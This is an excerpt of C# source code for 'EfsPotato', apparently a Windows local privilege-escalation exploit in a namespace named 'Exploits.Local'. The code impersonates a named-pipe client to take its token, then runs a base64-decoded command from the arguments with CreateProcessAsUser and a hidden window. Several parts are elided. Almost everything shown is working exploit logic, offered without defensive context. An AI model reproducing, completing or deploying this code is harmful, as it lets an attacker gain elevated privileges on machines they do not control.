...
namespace Zcg.Exploits.Local
{
    class EfsPotato
    {
        static string DecodeBase64(string base64Input)
        {
            byte[] decodeBytes = Convert.FromBase64String(base64Input);
            string decodeString = Encoding.UTF8.GetString(decodeBytes);
            return decodeString;
        }
        static void usage()
        {
        ...
        static void Main(string[] args)
        {
            ...
            if (mre.WaitOne(3000))
            {
                if (ImpersonateNamedPipeClient(hPipe))
                {
                    ...
                    si.dwFlags = 0x101;
                    si.wShowWindow = 0;
                    string cammond = DecodeBase64(args[0]);
                    if (CreateProcessAsUser(tkn, null, cammond, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
